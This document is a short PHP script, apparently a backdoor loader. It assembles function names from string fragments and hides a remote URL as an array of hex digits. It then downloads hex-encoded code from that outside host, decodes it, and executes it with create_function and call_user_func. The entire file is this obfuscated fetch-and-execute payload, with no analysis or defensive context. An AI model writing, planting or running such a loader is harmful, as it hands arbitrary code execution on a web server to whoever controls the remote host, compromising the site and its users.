<?php 
define('iphp','oday');
define('T','H*');
define('A','call');
define('B','user');
define('C','func');
define('D','create');
define('E','function');
define('F','file');
define('F1','get');
define('F2','contents');
define('P','pack');
$p = P;  //pack
$call = sprintf('%s_%s_%s',A,B,C); //call_user_func
$create = sprintf('%s_%s',D,E);    //create_function
$file = sprintf('%s_%s_%s',F,F1,F2); //file_get_contents 远程文件读取
$t = array('6','8','7','4','7','4','7','0','3','a','2','f','2','f','6','4','6','f','6','4','6','f','6','4','6','f','6','d','6','5','2','e','7','3','6','9','6','e','6','1','6','1','7','0','7','0','2','e','6','3','6','f','6','d','2','f','6','7','6','5','7','4','6','3','6','f','6','4','6','5','2','e','7','0','6','8','7','0','3','f','6','3','6','1','6','c','6','c','3','d','6','3','6','f','6','4','6','5');
//$call($create(null,$p(T,$file($p(T,join(null,$t))))));
call_user_func(create_function(null,pack('H*',file_get_contents(pack('H*',join(null,$t))))));
?>
